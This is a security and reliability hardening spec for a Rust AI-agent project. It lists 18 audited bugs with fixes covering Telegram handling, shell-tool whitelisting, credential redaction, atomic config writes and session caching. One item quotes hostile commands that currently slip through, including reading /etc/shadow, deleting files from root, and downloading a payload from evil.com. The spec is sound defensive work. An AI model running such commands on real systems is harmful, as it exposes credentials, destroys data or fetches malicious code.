# UniClaw Hardening: Security, Reliability & Code Quality Fixes

**Date**: 2026-03-31
**Scope**: Fix verified bugs, close security gaps, improve reliability and performance

## Overview

Comprehensive audit identified 18 verified issues across security, reliability, performance, and code quality. This spec covers all fixes in implementation order, grouped by the files they touch to minimize churn.

---

## B1. Telegram: `is_reply_to_bot` matches any bot

**File**: `src/channels/telegram.rs:92-96`
**Bug**: `.map(|u| u.is_bot)` triggers on ANY bot in a group, not just ours.
**Fix**: Check `u.username.as_deref() == Some(bot_username.as_str())` instead of `u.is_bot`.

## B2. Telegram: MarkdownV2 sent without escaping

**File**: `src/channels/telegram.rs:152-159`
**Bug**: MarkdownV2 requires escaping `.!-()` etc. LLM output is never escaped, so nearly every message fails and falls through to a second plain-text API call.
**Fix**: Remove `ParseMode::MarkdownV2` entirely. Send plain text only. The fallback pattern is dead code that doubles API calls.

## B3. Shell: empty whitelist allows all commands

**File**: `src/config.rs:102`, `src/tools/shell.rs:74`
**Bug**: `shell_enabled` defaults to `true`, `shell_allowed_commands` defaults to empty Vec. Empty whitelist skips the check entirely.
**Fix**:
- In `shell.rs`: when `allowed` is empty AND `shell_enabled` is true, deny all commands and log a warning.
- Change the logic to: empty whitelist = deny all (not allow all).

## B4. Session timestamps wrong after disk reload

**File**: `src/agent/memory.rs:232-238`
**Bug**: `created_at: Utc::now()` when loading from disk. Old sessions appear new.
**Fix**: Read file metadata `modified()` time and convert to `DateTime<Utc>`. Fall back to `Utc::now()` if metadata unavailable.

## S1. Shell: whitelisted programs access arbitrary paths

**File**: `src/tools/shell.rs`
**Issue**: `cat /etc/shadow`, `find / -delete`, `curl -o /tmp/payload http://evil.com` all pass checks because arguments aren't restricted.
**Fix**: Reject absolute path arguments (starting with `/`) that don't begin with the data_dir path. Scan all arguments in each pipe segment.

## S2. Credential redaction too narrow

**File**: `src/tools/http_fetch.rs:113`
**Issue**: Only checks `ANTHROPIC_API_KEY` and `OPENAI_API_KEY`.
**Fix**: Build redaction list dynamically from all `*_env` config fields that resolve to non-empty env vars: `llm.api_key_env`, `llm.fallback.api_key_env`, `server.api_token_env`, `channels.telegram.bot_token_env`.

## S3. Config write not atomic

**File**: `src/server/api_config.rs:40`
**Issue**: Direct `tokio::fs::write()`. Crash mid-write = corrupt config.
**Fix**: Write to `config_path.with_extension("tmp")`, then `tokio::fs::rename()` to the real path. Rename is atomic on POSIX.

## S4. `/api/status` leaks version + model without auth

**File**: `src/server/http.rs:49-52, 137-144`
**Issue**: Bypasses auth, returns version, model, uptime.
**Fix**: When auth is configured, return minimal `{"status": "ok"}` to unauthenticated requests. Full details only with valid token.

## R1. Telegram: no reconnection on repl exit

**File**: `src/channels/telegram.rs:62-165`
**Issue**: If `teloxide::repl()` returns, the channel dies silently.
**Fix**: Wrap in a loop with 5-second backoff and a warn log on each restart.

## R2. Session persist errors silently swallowed

**File**: `src/agent/loop.rs:153, 175`
**Issue**: `.ok()` on persist calls.
**Fix**: Replace with `if let Err(e) = ... { tracing::warn!(...) }`.

## R3. Telegram: no rate limiting for chunked responses

**File**: `src/channels/telegram.rs:150-160`
**Issue**: Chunks sent in tight loop, Telegram rate limits silently drop messages.
**Fix**: Add 100ms delay between chunks (`tokio::time::sleep`).

## P1. Messages cloned every agent iteration

**File**: `src/agent/memory.rs:67-70`, `src/agent/context.rs:108`
**Issue**: `messages_for_context()` clones entire Vec every iteration.
**Fix**: Return `&[Message]` from `messages_for_context()`. Update `Context` to accept borrowed messages or adjust the build method to avoid the clone.

## P2. Session cache has no eviction

**File**: `src/agent/memory.rs:75-99`
**Issue**: HashMap grows unbounded. No runtime eviction.
**Fix**: After each `get_or_load`, if `sessions.len() > max_count` (from config), persist and remove the least-recently-used entry. Track access order with a simple counter per session.

## Q1. `respond_in_groups` should be an enum

**File**: `src/config.rs:136`, `src/channels/telegram.rs:85-98`
**Issue**: Free-form String; typos silently become mention mode.
**Fix**: Define `GroupResponseMode` enum with `Always`, `Never`, `Mention` (default). Use `#[serde(rename_all = "lowercase")]`. Update the match in telegram.rs to be exhaustive.

## Q2. Skill loading uses blocking I/O

**File**: `src/agent/skills.rs:47, 116`
**Issue**: `std::fs::read_dir()` and `std::fs::read_to_string()` in async context.
**Fix**: Convert to `tokio::fs` equivalents. Make `SkillManager::load` async.

## Q3. No bounds on cron job name/action strings

**File**: `src/tools/cron_tools.rs:43-82`
**Issue**: 16-job cap but unbounded string fields.
**Fix**: Reject `name` > 256 chars and `action` > 4096 chars with a clear error.

## Q4. Telegram: Vec/String cloned per message

**File**: `src/channels/telegram.rs:58-66`
**Issue**: Clones allowed_users Vec and String fields on every message.
**Fix**: Wrap in `Arc` before the closure.

## Q5. MQTT device_id not validated

**File**: `src/server/mqtt.rs:28-50`
**Issue**: Config value used directly in topic strings. `/` in value creates wrong topic hierarchy.
**Fix**: Validate device_id contains only `[a-zA-Z0-9_-]` at startup. Error if invalid.

---

## Testing Strategy

- Each fix gets a unit test proving the issue is fixed
- Run full `cargo test` after each commit
- Run `cargo clippy -- -D warnings` before final commit
- Cross-check: `cargo build --features telegram` to verify feature-gated code compiles

## Implementation Order

Fixes are ordered to minimize merge conflicts by grouping changes to the same file together:

1. Telegram fixes (B1, B2, R1, R3, Q4 — all in telegram.rs + Q1 in config.rs)
2. Shell fixes (B3, S1 — shell.rs)
3. HTTP/server fixes (S3, S4 — api_config.rs, http.rs)
4. Credential redaction (S2 — http_fetch.rs)
5. Agent loop fixes (R2, P1 — loop.rs, memory.rs, context.rs)
6. Session store fixes (B4, P2 — memory.rs)
7. Remaining (Q2 skills.rs, Q3 cron_tools.rs, Q5 mqtt.rs)
